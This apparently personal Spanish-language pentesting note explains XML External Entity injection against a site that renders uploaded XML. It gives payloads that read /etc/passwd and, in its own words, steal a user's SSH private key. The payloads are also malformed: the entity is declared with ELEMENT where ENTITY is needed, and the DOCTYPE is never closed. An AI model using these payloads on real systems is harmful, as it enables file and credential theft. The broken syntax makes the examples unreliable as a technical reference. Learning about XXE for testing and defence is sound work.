XML External Entity esta es una vulnerabilidad en la por medio de una estructura *XML* a través de la declaración de entidades podemos ver archivos locales e incluso a ejecutar comandos.

Supongamos el caso de una pagina web donde puedes subir archivos *XML* conteniendo ciertas etiquetas en el archivo.

- Elements
- Author
- Subject
- Content

``` xml
<elements>
	<Author>S4tisfacti0n</Author>
	<Subject>Es una prueba</Subject>
	<Content>example</Content>
</elements>
```

y  nosotros subimos este archivo y podemos ver que carga este contenido en la web de manera interpretada.

Así que podemos aprovechar esto e inyectar entidades para después con un wrappers de tipo file y hacer un poco de [[LFI & RFI|LFI]].

``` xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
	<!ELEMENT foo ANY >
	<!ELEMENT xxe SYSTEM "file:///etc/passwd"]
<elements>
	<Author>&xxe;</Author> <!-- Mostramos el valor de la variable xxe --> 
	<Subject>Es una prueba</Subject>
	<Content>example</Content>
</elements>
```

Igual mente podemos robar la llave privada de la siguiente forma
``` xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
	<!ELEMENT foo ANY >
	<!ELEMENT xxe SYSTEM "file:///home/s4tisfacti0n/.ssh/id_rsa"]
<elements>
	<Author>&xxe;</Author> <!-- Mostramos el valor de la variable xxe --> 
	<Subject>Es una prueba</Subject>
	<Content>example</Content>
</elements>
```

También existe una técnica casi igual a esta solo que en esta no puedes ver lo que representa ese *XML* en ese caso tendríamos que montarnos nuestras propias entidades y ser llamadas por la maquina victima.